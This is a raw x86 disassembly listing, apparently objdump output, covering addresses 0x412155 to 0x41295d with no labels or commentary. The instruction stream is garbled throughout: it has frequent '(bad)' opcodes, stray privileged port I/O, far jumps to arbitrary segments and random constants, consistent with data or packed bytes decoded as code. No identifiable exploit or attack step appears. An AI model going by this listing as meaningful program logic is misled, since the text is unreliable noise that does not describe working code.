  412155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412156:	sub    DWORD PTR [edi],ebp
  412158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412159:	repz cmc 
  41215b:	fst    DWORD PTR [edx+ebp*8+0x2d]
  41215f:	xchg   DWORD PTR [eax-0x53],ebp
  412162:	sbb    DWORD PTR [eax-0x15],edi
  412165:	jmp    DWORD PTR [edi-0x4f]
  412168:	(bad)  
  412169:	loopne 0x41212f
  41216b:	imul   esp,DWORD PTR [edx+0x7f],0x6d01f15
  412172:	sbb    BYTE PTR [eax],al
  412174:	call   0xe6d2:0x7375db6b
  41217b:	in     eax,dx
  41217c:	and    bl,BYTE PTR [edx-0x64]
  41217f:	push   edi
  412180:	push   ss
  412181:	outs   dx,DWORD PTR ds:[esi]
  412182:	add    BYTE PTR [edx-0x3d],bh
  412185:	adc    DWORD PTR [edx+0x74],0x2a
  412189:	lods   al,BYTE PTR ds:[esi]
  41218a:	jmp    0xa2fe467f
  41218f:	xor    cl,ch
  412191:	pushf  
  412192:	and    ecx,eax
  412194:	xor    al,0x3
  412196:	push   esi
  412197:	cdq    
  412198:	lock cmp al,cl
  41219b:	dec    edi
  41219c:	aad    0x6e
  41219e:	push   ds
  41219f:	xor    ebx,0xffffffb8
  4121a2:	out    dx,eax
  4121a3:	xor    BYTE PTR [edx+0x6a],ch
  4121a6:	hlt    
  4121a7:	sub    edx,edx
  4121a9:	imul   edx,DWORD PTR [ebx-0x4c8ab379],0xffffffdc
  4121b0:	inc    ebp
  4121b1:	in     al,0xd9
  4121b3:	fidivr DWORD PTR [ecx+0x7415c217]
  4121b9:	out    dx,eax
  4121ba:	in     eax,0x19
  4121bc:	push   esp
  4121bd:	push   edi
  4121be:	or     al,0xa
  4121c1:	mov    ebp,0xa2c42341
  4121c6:	inc    esi
  4121c7:	mov    ds:0xce6a693a,al
  4121cc:	test   al,0x17
  4121ce:	adc    eax,0x25d47669
  4121d3:	pop    ds
  4121d4:	xor    bh,BYTE PTR [esi+0x64]
  4121d7:	mov    DWORD PTR [esi+ebp*8-0x48e778d7],ebx
  4121de:	daa    
  4121df:	or     esi,ecx
  4121e1:	leave  
  4121e2:	iret   
  4121e3:	xor    bh,bh
  4121e5:	ficomp DWORD PTR [edx-0x60]
  4121e8:	or     DWORD PTR [esp+eax*1-0x5b],edi
  4121ec:	jo     0x412217
  4121ee:	fwait
  4121ef:	mov    al,ds:0x57791f73
  4121f4:	mov    dh,0x15
  4121f6:	ret    
  4121f7:	cdq    
  4121f8:	xor    al,0x7a
  4121fa:	jne    0x412264
  4121fc:	das    
  4121fd:	inc    esp
  4121fe:	pop    edx
  4121ff:	adc    al,0x3e
  412201:	xor    al,BYTE PTR [ecx-0x297f3fdf]
  412207:	ds (bad) 
  41220a:	arpl   WORD PTR [esp+ecx*8-0x331addc5],sp
  412211:	or     ebp,DWORD PTR [eax+0x2b]
  412214:	jge    0x412200
  412216:	adc    BYTE PTR [ecx],ah
  412218:	or     dl,BYTE PTR [eax+esi*8-0x60d784a8]
  41221f:	mov    esi,0x711e0774
  412224:	xchg   ch,bl
  412226:	(bad)  
  412227:	inc    DWORD PTR [edx-0x2f]
  41222a:	add    ebx,DWORD PTR [eax+0x6a43cf20]
  412230:	sub    al,0xbb
  412232:	xchg   edi,eax
  412233:	xchg   esp,eax
  412234:	fisubr DWORD PTR [eax+0x1c]
  412237:	stos   DWORD PTR es:[edi],eax
  412238:	mov    esp,ebp
  41223a:	sti    
  41223b:	scas   eax,DWORD PTR es:[edi]
  41223c:	cmp    eax,0xec3755e9
  412241:	mov    DWORD PTR [ebp-0x316a9b1c],esp
  412247:	stos   DWORD PTR es:[edi],eax
  412248:	cwde   
  412249:	out    0x32,eax
  41224b:	(bad)  
  41224c:	cs adc edi,edi
  41224f:	sbb    al,0x77
  412251:	dec    edi
  412252:	pop    edx
  412253:	stos   DWORD PTR es:[edi],eax
  412254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412255:	xor    edx,DWORD PTR [edi-0x23]
  412258:	push   edx
  412259:	sub    BYTE PTR [edi],al
  41225b:	mov    ebx,0x3af8cc08
  412260:	retf   
  412261:	inc    edi
  412262:	mov    edi,0xab2b2ac7
  412267:	or     DWORD PTR [edx+0x15],esp
  41226a:	jne    0x4121ee
  41226c:	das    
  41226d:	mov    ch,BYTE PTR [edx+0x20]
  412270:	aas    
  412271:	push   edi
  412272:	aaa    
  412273:	pop    esi
  412274:	repnz mov eax,ds:0xde7b280d
  41227a:	je     0x4122b9
  41227c:	xchg   ebp,eax
  41227d:	std    
  41227e:	ja     0x41223f
  412280:	mov    dh,BYTE PTR [esi-0x6810573e]
  412286:	stc    
  412287:	loop   0x412225
  412289:	call   0xdd79:0x8af624b1
  412290:	out    dx,al
  412291:	fidiv  WORD PTR [edi-0x2e3d50cf]
  412297:	imul   ecx,DWORD PTR [ecx],0xcb01dd79
  41229d:	into   
  41229e:	sub    eax,0xa868f0a1
  4122a3:	dec    edx
  4122a4:	sub    ebx,DWORD PTR [eax-0x26]
  4122a7:	mov    cl,BYTE PTR [ecx+edi*8-0x69b6369d]
  4122ae:	mov    ebx,ebp
  4122b0:	jmp    0x4122f5
  4122b2:	mov    esi,0xf7ba0d35
  4122b7:	cwde   
  4122b8:	dec    ebx
  4122b9:	pop    eax
  4122ba:	int    0xba
  4122bc:	ret    0x877f
  4122bf:	dec    edx
  4122c0:	sbb    ebx,DWORD PTR [eax+eax*4+0x7a47b97f]
  4122c7:	imul   edi,DWORD PTR [ebx],0x51
  4122ca:	cmc    
  4122cb:	pop    ecx
  4122cc:	lds    ebp,FWORD PTR [eax]
  4122ce:	or     eax,0xaedc6259
  4122d3:	gs mov cl,0xd1
  4122d6:	fadd   DWORD PTR [ebp+0x37]
  4122d9:	jmp    0x64ca3e4f
  4122de:	mov    WORD PTR [edi-0x6e942937],fs
  4122e4:	aaa    
  4122e5:	cld    
  4122e6:	pushf  
  4122e7:	pop    ss
  4122e8:	mov    ah,0xd4
  4122ea:	cld    
  4122eb:	in     al,dx
  4122ec:	sub    DWORD PTR [esi-0x77],esp
  4122ef:	retf   
  4122f0:	das    
  4122f1:	add    DWORD PTR [edx-0x71c3172],ebp
  4122f7:	xchg   esp,eax
  4122f8:	(bad)  
  4122f9:	xor    eax,0x5dddd25d
  4122fe:	mov    bh,0xa2
  412300:	cmp    al,0x5
  412302:	mov    edx,0x5803e87e
  412307:	dec    ebp
  412308:	popf   
  412309:	push   esp
  41230a:	adc    eax,0x80ca7585
  41230f:	pop    ebp
  412310:	stos   DWORD PTR es:[edi],eax
  412311:	shr    DWORD PTR [edi-0x5de64d0f],1
  412317:	in     eax,dx
  412318:	add    BYTE PTR gs:[ecx],al
  41231b:	sti    
  41231c:	mov    bl,0x31
  41231e:	xor    BYTE PTR [ecx-0x33735957],ah
  412324:	cld    
  412325:	repz in eax,dx
  412327:	mov    bh,0xb
  412329:	mov    al,BYTE PTR [ebx]
  41232b:	int    0x91
  41232d:	icebp  
  41232e:	dec    ebp
  41232f:	(bad)  
  412330:	scas   al,BYTE PTR es:[edi]
  412331:	mov    ds:0xaf4692a8,eax
  412336:	aad    0x57
  412338:	pop    ds
  412339:	fwait
  41233a:	imul   edx,ebp,0xffffffc8
  41233d:	aas    
  41233e:	retf   0xb916
  412341:	push   ds
  412342:	sub    BYTE PTR [eax+0x4329ac31],bl
  412348:	cmc    
  412349:	dec    esp
  41234a:	push   esi
  41234b:	pop    esp
  41234c:	adc    DWORD PTR [eax],0xffffff8b
  41234f:	xor    ebp,edi
  412351:	enter  0xc315,0x2b
  412355:	fs xchg ebx,eax
  412357:	inc    ebx
  412358:	sbb    eax,0xca2790a9
  41235d:	and    eax,0x7d06c7fb
  412362:	mov    esp,0xe570fc1
  412367:	sar    BYTE PTR [esi+edi*1+0x20],0xa4
  41236c:	add    al,0xa7
  41236e:	pop    ss
  41236f:	gs adc al,0x6e
  412372:	fcom   QWORD PTR [esi]
  412374:	aad    0x9d
  412376:	fidivr WORD PTR [ebp+0x620bb4c]
  41237c:	mov    ebp,0x8e8e4ed6
  412381:	ja     0x412313
  412383:	int3   
  412384:	push   0x77
  412386:	cdq    
  412387:	stc    
  412388:	sbb    ebx,esp
  41238a:	fwait
  41238b:	add    eax,0xc2c1c35b
  412390:	retf   
  412391:	jb     0x41240f
  412393:	sbb    edx,DWORD PTR [eax]
  412395:	aaa    
  412396:	ja     0x4123d8
  412398:	sub    al,0x51
  41239a:	leave  
  41239b:	xor    edx,DWORD PTR [edx+0x7a3149dd]
  4123a1:	es scas al,BYTE PTR es:[edi]
  4123a3:	aam    0xaf
  4123a5:	ins    BYTE PTR es:[edi],dx
  4123a6:	jo     0x412405
  4123a8:	push   cs
  4123a9:	mov    esp,0x95fe6919
  4123ae:	sub    BYTE PTR [ecx],ah
  4123b0:	dec    esi
  4123b1:	mov    ecx,?
  4123b3:	repnz inc ebx
  4123b5:	sbb    BYTE PTR [edx],dl
  4123b7:	pop    ecx
  4123b8:	mov    ch,BYTE PTR [ecx]
  4123ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123bb:	jbe    0x41242a
  4123bd:	aad    0x5e
  4123bf:	inc    edi
  4123c0:	std    
  4123c1:	nop
  4123c2:	mov    dh,0x40
  4123c4:	xor    al,0xdd
  4123c6:	ins    DWORD PTR es:[edi],dx
  4123c7:	dec    esp
  4123c8:	es pushf 
  4123ca:	sbb    ebp,DWORD PTR [ebx]
  4123cc:	out    dx,al
  4123cd:	sti    
  4123ce:	shl    BYTE PTR [ecx+0x138b6b93],1
  4123d4:	out    0xd5,al
  4123d6:	ret    
  4123d7:	and    al,0x1d
  4123d9:	mov    edx,0xa27905ce
  4123de:	adc    al,0xe7
  4123e0:	add    al,0xd3
  4123e2:	mov    WORD PTR [ecx+eax*8+0x4a069534],?
  4123e9:	dec    eax
  4123ea:	mov    esi,0x9f5c0c8f
  4123ef:	stos   BYTE PTR es:[edi],al
  4123f0:	sbb    WORD PTR [ebp-0x33],ax
  4123f4:	sbb    eax,0xcc2ee767
  4123f9:	test   DWORD PTR [eax-0x4c],eax
  4123fc:	jmp    0x4123cd
  4123fe:	push   ecx
  4123ff:	fs icebp 
  412401:	repnz imul eax,ebp,0x7e2b88e
  412408:	aam    0x95
  41240a:	cmp    esi,DWORD PTR [esi-0x5c]
  41240d:	ror    ecx,cl
  41240f:	jp     0x4123e0
  412411:	repnz cmp dh,ch
  412414:	mov    eax,ds:0xa76b7305
  412419:	jo     0x4123fc
  41241b:	mov    cl,0xda
  41241d:	fs aad 0xea
  412420:	fs mov eax,0xd0efc099
  412426:	pop    edx
  412427:	daa    
  412428:	sbb    BYTE PTR [ecx-0x337a9feb],cl
  41242e:	xor    ch,BYTE PTR [ebp+0x4e]
  412431:	dec    edx
  412432:	call   0xa524:0xcb42d468
  412439:	out    0x39,al
  41243b:	add    esp,DWORD PTR ds:0x16e8b4cf
  412441:	jg     0x4123e1
  412443:	lock mov edx,0x1452e270
  412449:	and    ah,0xa5
  41244c:	dec    ecx
  41244d:	xor    ah,bh
  41244f:	arpl   dx,sp
  412451:	or     ch,bl
  412453:	add    al,0xfd
  412455:	and    bl,BYTE PTR [ebx+0x23]
  412458:	cdq    
  412459:	or     DWORD PTR [ecx+0x7],0x4bd30315
  412460:	xchg   ecx,eax
  412461:	mov    esp,0xddf4d703
  412466:	lods   al,BYTE PTR ds:[esi]
  412467:	cdq    
  412468:	pop    eax
  412469:	jns    0x4124dd
  41246b:	cmp    DWORD PTR cs:[edx+0x5c],esi
  41246f:	xchg   ebx,eax
  412470:	mov    eax,ecx
  412472:	xchg   ebx,eax
  412473:	and    al,0x79
  412475:	xor    al,0x66
  412477:	sub    BYTE PTR [ecx+ebx*1+0x309ad40f],ah
  41247e:	test   DWORD PTR [esi+0x3112b10f],ebp
  412484:	xchg   ebx,eax
  412485:	pop    es
  412486:	daa    
  412487:	loop   0x412442
  412489:	push   esp
  41248a:	sbb    eax,0x7bc9eff1
  41248f:	pop    eax
  412490:	adc    eax,0x477ecd35
  412495:	push   0xfffffff9
  412497:	js     0x41241e
  412499:	add    al,al
  41249b:	inc    edx
  41249c:	adc    esp,DWORD PTR [ebx+0x4f]
  41249f:	daa    
  4124a0:	(bad)  
  4124a1:	mov    bl,0x1e
  4124a3:	mov    ebx,0x108c49fc
  4124a8:	dec    ebx
  4124a9:	cmp    eax,0x516c9e85
  4124ae:	or     ecx,DWORD PTR [ebp-0x59]
  4124b1:	arpl   dx,cx
  4124b3:	mov    ebp,edi
  4124b5:	push   edi
  4124b6:	pop    es
  4124b7:	jle    0x4124ba
  4124b9:	push   edi
  4124ba:	jl     0x4124bd
  4124bc:	jecxz  0x412502
  4124be:	or     edx,DWORD PTR [esi+0x6a]
  4124c1:	les    esi,FWORD PTR [ecx-0x68ea0c7f]
  4124c7:	inc    ebx
  4124c8:	dec    esi
  4124c9:	dec    ebx
  4124ca:	mov    dh,0xd5
  4124cc:	lea    esi,[ebx+0x31d62f98]
  4124d2:	inc    esi
  4124d3:	mov    ebp,DWORD PTR [edi+0x17369be6]
  4124d9:	sbb    DWORD PTR [esi-0x80],0x6a
  4124dd:	pop    eax
  4124de:	ja     0x412528
  4124e0:	mov    DWORD PTR [edi-0x505050b7],esi
  4124e6:	fimul  DWORD PTR [eax-0x5d258f93]
  4124ec:	mov    ebp,esi
  4124ee:	arpl   WORD PTR [eax],di
  4124f0:	out    dx,al
  4124f1:	push   ebp
  4124f2:	dec    ebp
  4124f3:	mov    eax,ds:0x6d3f5c91
  4124f8:	adc    al,0xf9
  4124fa:	pop    edx
  4124fb:	rol    BYTE PTR [eax-0x27],cl
  4124fe:	fdivr  DWORD PTR [esi+0x296c537b]
  412504:	inc    ecx
  412505:	sub    ecx,DWORD PTR [edi+0x22]
  412508:	mov    dh,0xe4
  41250a:	inc    esp
  41250b:	cld    
  41250c:	imul   edi,DWORD PTR [esi+eiz*1+0x74d26b39],0xe1c4c0e
  412517:	jno    0x41251e
  412519:	mov    WORD PTR [edi+eax*8],?
  41251c:	gs ja  0x412533
  41251f:	xor    BYTE PTR [ebx],ah
  412521:	pop    esp
  412522:	mov    edi,0x30076a1f
  412527:	inc    esp
  412528:	pop    edi
  412529:	mov    esi,esi
  41252b:	jns    0x412563
  41252d:	(bad)  
  41252e:	scas   eax,DWORD PTR es:[edi]
  41252f:	dec    ebx
  412530:	xor    BYTE PTR [ebx],dh
  412532:	mov    esp,0x17369ec6
  412537:	dec    ecx
  412538:	test   eax,0x70ece2ee
  41253d:	mov    esp,0xe7751ff6
  412542:	fcom   QWORD PTR [esi]
  412544:	xchg   ebp,eax
  412545:	jl     0x412576
  412547:	out    dx,al
  412548:	adc    eax,0xcaca6857
  41254d:	mov    esi,0x6a8eda99
  412552:	inc    ebp
  412553:	stos   BYTE PTR es:[edi],al
  412554:	and    BYTE PTR ds:0xfdb2eff5,bl
  41255a:	gs ret 0xc3f6
  41255e:	out    0x9,eax
  412560:	outs   dx,BYTE PTR ds:[esi]
  412561:	jl     0x4125ba
  412563:	push   ebp
  412564:	pushf  
  412565:	inc    esi
  412566:	dec    ebx
  412567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412568:	in     eax,dx
  412569:	push   cs
  41256a:	mov    DWORD PTR [ebx+0x50c3c37b],0xb5da2ac1
  412574:	xchg   ebp,eax
  412575:	mov    eax,ds:0x493e787
  41257a:	mov    ah,0x5d
  41257c:	push   ebp
  41257d:	mov    al,0xe8
  41257f:	pop    ss
  412580:	leave  
  412581:	outs   dx,DWORD PTR ds:[esi]
  412582:	sub    BYTE PTR [esi-0x7828e7ed],bh
  412588:	xor    ecx,ecx
  41258a:	jmp    0xa477ddd
  41258f:	(bad)  
  412590:	gs repnz pop edx
  412593:	push   esi
  412594:	and    dl,BYTE PTR [ebp+0x24336a81]
  41259a:	leave  
  41259b:	shr    DWORD PTR [esi],0x5e
  41259e:	ret    0x631c
  4125a1:	or     edx,edx
  4125a3:	cli    
  4125a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125a5:	frstor [ebx+ebx*8]
  4125a8:	add    esp,DWORD PTR [edi-0x56]
  4125ab:	adc    eax,0xa1e3effe
  4125b0:	mov    cl,0xca
  4125b2:	stc    
  4125b3:	mov    eax,0xddbe9e56
  4125b8:	inc    eax
  4125b9:	or     bh,BYTE PTR [ebx+0x1]
  4125bc:	scas   eax,DWORD PTR es:[edi]
  4125bd:	cli    
  4125be:	(bad)  
  4125bf:	dec    edx
  4125c0:	or     ebx,DWORD PTR [eax+ecx*1-0xd]
  4125c4:	fst    st(5)
  4125c6:	jge    0x4125f2
  4125c8:	popa   
  4125c9:	adc    esp,DWORD PTR [edx+0x68]
  4125cc:	sbb    eax,0x3b90e2a2
  4125d1:	ja     0x412625
  4125d3:	fwait
  4125d4:	xor    BYTE PTR [ebp+0x2ac4d6a8],0xfd
  4125db:	in     eax,0xef
  4125dd:	xor    edx,esp
  4125df:	adc    esp,DWORD PTR [edi]
  4125e1:	adc    BYTE PTR [eax-0x50113a47],bl
  4125e7:	jno    0x4125f5
  4125e9:	sub    al,0x81
  4125eb:	add    al,0x49
  4125ed:	dec    eax
  4125ee:	stos   BYTE PTR es:[edi],al
  4125ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125f0:	sbb    al,0xf2
  4125f2:	push   ds
  4125f3:	in     al,0xd7
  4125f5:	push   es
  4125f6:	jbe    0x41258b
  4125f8:	sbb    esi,DWORD PTR [esi+0x2686db71]
  4125fe:	mov    dh,BYTE PTR [edx-0x20d8d0f2]
  412604:	hlt    
  412605:	pop    edi
  412606:	sub    ch,dh
  412608:	pop    ebx
  412609:	ficom  WORD PTR [ebx]
  41260b:	add    bl,BYTE PTR [edx-0x18]
  41260e:	cmp    bl,BYTE PTR [edi+0x75]
  412611:	add    al,0xae
  412613:	sbb    esi,edx
  412615:	push   0xaf29bca9
  41261a:	cmp    ebp,DWORD PTR [eax-0xc290d31]
  412620:	sbb    BYTE PTR [edi+eiz*8],dl
  412623:	sbb    ah,BYTE PTR [ebp-0x7e2098fb]
  412629:	mov    esp,0xc4c11875
  41262e:	ja     0x4125f6
  412630:	shl    ecx,cl
  412632:	and    al,0x30
  412634:	cmp    BYTE PTR ds:[eax-0x9b05b2],cl
  41263b:	int    0x27
  41263d:	ror    BYTE PTR [eax+0x43d5fc45],0x57
  412644:	ins    DWORD PTR es:[edi],dx
  412645:	das    
  412646:	adc    eax,0x7606033b
  41264b:	xchg   esi,eax
  41264c:	push   edx
  41264d:	and    eax,0x4cf945fe
  412652:	test   DWORD PTR [ebx],0xa799f198
  412658:	cmp    ebp,DWORD PTR [esi+esi*8+0x7a]
  41265c:	mov    al,0x3f
  41265e:	jb     0x41263c
  412660:	xchg   edx,eax
  412661:	iret   
  412662:	(bad)  
  412663:	push   edi
  412664:	lahf   
  412665:	addr16 int3 
  412667:	cmc    
  412668:	dec    edx
  412669:	enter  0x9396,0xb0
  41266d:	push   0xa1f6cfe7
  412672:	clc    
  412673:	mov    edi,0x97407009
  412678:	add    BYTE PTR [ebp+0x47],ch
  41267b:	out    dx,eax
  41267c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41267e:	mov    cl,BYTE PTR ds:0x7108b9e4
  412684:	outs   dx,DWORD PTR ds:[esi]
  412685:	inc    edi
  412686:	retf   0x97cf
  412689:	fst    QWORD PTR [ebx]
  41268b:	loop   0x412682
  41268d:	loop   0x41260f
  41268f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412690:	xchg   edx,eax
  412691:	stc    
  412692:	fmul   QWORD PTR [edx+0x5e83e525]
  412698:	xor    BYTE PTR cs:[eax+0x1b],ch
  41269c:	add    DWORD PTR [esi+0x29e284aa],eax
  4126a2:	jl     0x41263a
  4126a4:	mov    ebx,0xd011f9ad
  4126a9:	cwde   
  4126aa:	mov    ebx,0x2b8f0161
  4126af:	les    ebx,FWORD PTR [edx+esi*8+0x50295fd9]
  4126b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126b7:	hlt    
  4126b8:	or     al,0xd7
  4126ba:	mov    bh,0xdb
  4126bc:	push   ebp
  4126bd:	pop    ds
  4126be:	sub    al,0x2c
  4126c0:	cmp    DWORD PTR [edx-0x3ddf6da7],ebp
  4126c6:	mov    BYTE PTR [eax-0x71],ah
  4126c9:	mov    edi,0x80173749
  4126ce:	jmp    0x3143:0xe310e912
  4126d5:	cmp    ebx,DWORD PTR [eax+0x43]
  4126d8:	mov    ds:0x47371289,eax
  4126dd:	or     BYTE PTR [ebp-0x53],ch
  4126e0:	in     eax,dx
  4126e1:	xchg   ebx,eax
  4126e2:	xor    ebx,DWORD PTR [esp+edi*2+0x77d813e2]
  4126e9:	lds    esi,FWORD PTR [edi-0x49]
  4126ec:	test   eax,0xdf369545
  4126f1:	mov    ah,0x90
  4126f3:	pusha  
  4126f4:	leave  
  4126f5:	lds    esi,FWORD PTR [eax+0x47ae3e76]
  4126fb:	repz adc al,0x4b
  4126fe:	pushf  
  4126ff:	int3   
  412700:	retf   0x69c
  412703:	dec    esi
  412704:	out    dx,al
  412705:	and    BYTE PTR [eax+0x14],0x56
  412709:	jnp    0x4126cb
  41270b:	lds    ebx,FWORD PTR [edi-0x79]
  41270e:	ss xchg esi,eax
  412710:	sbb    BYTE PTR [ebp+0x1a682704],ch
  412716:	mov    ebx,edi
  412718:	dec    esp
  412719:	out    0xfc,eax
  41271b:	fidivr WORD PTR [ebx+0x2b377741]
  412721:	loop   0x412751
  412723:	mov    ds:0x678ab458,al
  412728:	xor    al,0x93
  41272a:	or     eax,0x126c599a
  41272f:	shl    BYTE PTR [ebx-0xb],0x58
  412733:	lock lock xacquire or BYTE PTR [ecx+0x6243d6af],bh
  41273c:	fistp  DWORD PTR [ecx+esi*4+0x54]
  412740:	jo     0x41278b
  412742:	or     ecx,DWORD PTR [edx]
  412744:	jmp    0xf2c6:0xf127c58b
  41274b:	pop    es
  41274c:	test   DWORD PTR [esi+0x72dbcbba],esp
  412752:	jno    0x412721
  412754:	ss mov bh,0xcc
  412757:	jge    0x412785
  412759:	mov    al,ds:0x1014e44e
  41275e:	mov    ds:0x693a6a14,eax
  412763:	popf   
  412764:	retf   
  412765:	call   0xd525af01
  41276a:	int3   
  41276b:	xor    edx,DWORD PTR [ebp-0x6e47d8c4]
  412771:	fbld   TBYTE PTR [eax+0x4e]
  412774:	mov    esi,?
  412776:	jmp    0xb2be96d3
  41277b:	ficomp WORD PTR [ebx-0x7b83fe48]
  412781:	retf   
  412782:	inc    eax
  412783:	nop
  412784:	ins    DWORD PTR es:[edi],dx
  412785:	mov    cl,0xef
  412787:	jle    0x4127dd
  412789:	out    0x87,al
  41278b:	gs call 0x425bda2d
  412791:	mov    al,ds:0xde179e3b
  412796:	jns    0x412726
  412798:	mov    bl,0x15
  41279a:	clc    
  41279b:	mov    bh,0x68
  41279d:	inc    eax
  41279e:	or     al,0xb6
  4127a0:	mov    ch,0x83
  4127a2:	lea    eax,[ebp+0x6e6a100c]
  4127a8:	mov    esi,0x7383c75b
  4127ad:	mov    ecx,0x65c46856
  4127b2:	movnti DWORD PTR [ecx-0x65],eax
  4127b6:	and    DWORD PTR [esi-0x5f],esi
  4127b9:	cmp    DWORD PTR [edx-0x5],esp
  4127bc:	mov    edx,0x9ada8f09
  4127c1:	inc    esi
  4127c2:	out    dx,al
  4127c3:	jp     0x412752
  4127c5:	dec    ebp
  4127c6:	mov    cl,0xef
  4127c8:	jle    0x41274b
  4127ca:	fwait
  4127cb:	cmc    
  4127cc:	ret    
  4127cd:	lods   al,BYTE PTR ds:[esi]
  4127ce:	(bad)  
  4127cf:	xchg   esi,eax
  4127d0:	shr    eax,0xf1
  4127d3:	out    0x12,eax
  4127d5:	in     eax,0x24
  4127d7:	loope  0x41277d
  4127d9:	pop    ss
  4127da:	hlt    
  4127db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127dc:	nop
  4127dd:	in     eax,dx
  4127de:	jecxz  0x412848
  4127e0:	push   ds
  4127e1:	pop    esi
  4127e2:	pushf  
  4127e3:	sti    
  4127e4:	in     eax,dx
  4127e5:	xor    BYTE PTR [eax+0x237d4c61],dl
  4127eb:	les    ebx,FWORD PTR [edx]
  4127ed:	inc    edx
  4127ee:	inc    esp
  4127ef:	fisttp WORD PTR [esp+esi*2]
  4127f2:	add    al,0x34
  4127f4:	jae    0x412816
  4127f6:	jmp    0x508b:0x1efa3c98
  4127fd:	and    bh,bl
  4127ff:	lds    ebx,FWORD PTR [eax]
  412801:	mov    ebx,0x89c347cb
  412806:	(bad)  [edx+0x70d2e2fe]
  41280c:	pop    ss
  41280d:	fsubr  QWORD PTR [ecx+ebp*4-0x25c5c667]
  412814:	scas   eax,DWORD PTR es:[edi]
  412815:	push   ebx
  412816:	add    ebx,DWORD PTR [ebp+edx*2+0x1f4b8471]
  41281d:	push   edx
  41281e:	loope  0x41284f
  412820:	xchg   esp,eax
  412821:	hlt    
  412822:	xchg   ebp,eax
  412823:	sbb    al,0x5e
  412825:	inc    esi
  412826:	adc    al,0xea
  412828:	inc    ebp
  412829:	mov    eax,ds:0x81e2d942
  41282e:	jnp    0x4127b6
  412830:	fistp  QWORD PTR [ecx+ecx*2+0x4a9ef1a0]
  412837:	add    BYTE PTR [ebx],cl
  412839:	jmp    0xceae1e9
  41283e:	mov    bl,0xaa
  412840:	sbb    BYTE PTR [ebx],bh
  412842:	cmp    dh,BYTE PTR [esi]
  412844:	sub    eax,0x39b6d39b
  412849:	psraw  mm5,QWORD PTR [edx+0x8]
  41284d:	xor    BYTE PTR [esi-0x39c95779],0x36
  412854:	icebp  
  412855:	inc    edx
  412856:	inc    edi
  412857:	inc    ecx
  412858:	pop    edi
  412859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41285a:	jns    0x4127f4
  41285c:	loop   0x41280b
  41285e:	leave  
  41285f:	ss ss xchg edi,eax
  412862:	jnp    0x41288e
  412864:	retf   
  412865:	ja     0x4127fc
  412867:	cmp    al,0x9c
  412869:	inc    edi
  41286a:	push   esi
  41286b:	loop   0x4128a4
  41286d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41286e:	add    al,0x36
  412870:	add    dl,bh
  412872:	pop    eax
  412873:	xchg   ebp,eax
  412874:	pop    esp
  412875:	cmp    edi,DWORD PTR [ebp-0x4e]
  412878:	add    DWORD PTR [ebp+0x6c],esi
  41287b:	into   
  41287c:	mov    bh,0x1f
  41287e:	adc    eax,0xdb3c0d82
  412883:	out    0xbb,eax
  412885:	dec    ecx
  412886:	call   0x5599:0xb142fc9a
  41288d:	lock push ss
  41288f:	sbb    eax,0x68eb52d4
  412894:	int3   
  412895:	ror    DWORD PTR [ebp+0x42f198db],cl
  41289b:	push   cs
  41289c:	fsub   DWORD PTR [ebx+ecx*8-0x29]
  4128a0:	mov    al,ds:0xf1d62f2
  4128a5:	dec    ecx
  4128a6:	xchg   esp,eax
  4128a7:	dec    ebp
  4128a8:	repnz (bad) 
  4128aa:	push   edi
  4128ab:	iret   
  4128ac:	xchg   ecx,eax
  4128ad:	cmp    BYTE PTR [ecx+esi*1],bl
  4128b0:	dec    ebx
  4128b1:	test   al,0x5d
  4128b3:	cmp    bh,BYTE PTR [edx]
  4128b5:	stos   DWORD PTR es:[edi],eax
  4128b6:	or     ah,BYTE PTR [esi]
  4128b8:	inc    ebx
  4128b9:	dec    esp
  4128ba:	(bad)
  4128be:	sub    DWORD PTR [ebp+eiz*8-0x1],ecx
  4128c2:	add    esp,esp
  4128c4:	adc    BYTE PTR [ebx],0x73
  4128c7:	fcomip st,st(7)
  4128c9:	(bad)
  4128cc:	xchg   BYTE PTR [edx],ch
  4128ce:	aam    0xc7
  4128d0:	xchg   BYTE PTR [edi],cl
  4128d2:	adc    eax,0x50a5edd8
  4128d7:	shl    DWORD PTR [eax+0xd9a712b],cl
  4128dd:	mov    ebx,0x2a1bbf86
  4128e2:	dec    edi
  4128e3:	or     DWORD PTR [esi-0x59],0x942ce8a5
  4128ea:	(bad)  
  4128eb:	aaa    
  4128ec:	ficom  DWORD PTR [ecx-0x6d385d6d]
  4128f2:	or     eax,0xc8f06d36
  4128f7:	or     dl,BYTE PTR [ebp+edx*8-0x1871a4c4]
  4128fe:	(bad)  
  4128ff:	push   esp
  412900:	rcl    DWORD PTR [edx-0x66ad115a],cl
  412906:	pop    esp
  412907:	xchg   BYTE PTR [esi+0x5d6db680],bh
  41290d:	and    al,0x6c
  41290f:	jb     0x412919
  412911:	ret    0x5bd3
  412914:	pop    esi
  412915:	(bad)  
  412916:	ficomp WORD PTR [esp+edi*2-0x4e]
  41291a:	inc    ebx
  41291b:	cmp    eax,0xa214736e
  412920:	jmp    0x325b:0xcb750847
  412927:	retf   0xcc77
  41292a:	pusha  
  41292b:	inc    eax
  41292c:	mov    WORD PTR [edi],gs
  41292e:	mov    WORD PTR [ecx],gs
  412930:	ja     0x4128d6
  412932:	or     DWORD PTR [edi-0x13],0x3d
  412936:	fistp  QWORD PTR [edi+0x6c]
  412939:	popa   
  41293a:	dec    ebx
  41293b:	shl    DWORD PTR es:[ebx],1
  41293e:	sbb    ch,bh
  412940:	fs inc ecx
  412942:	mov    ah,0x63
  412944:	addr16 push 0xdb91ae4a
  41294a:	push   ds
  41294b:	or     BYTE PTR [ebx+0x40091b89],0x7
  412952:	pop    ecx
  412953:	push   es
  412954:	and    al,0xb9
  412956:	sub    edx,DWORD PTR [ebx]
  412958:	stc    
  412959:	aad    0x58
  41295b:	je     0x412927
  41295d:	pop    ecx
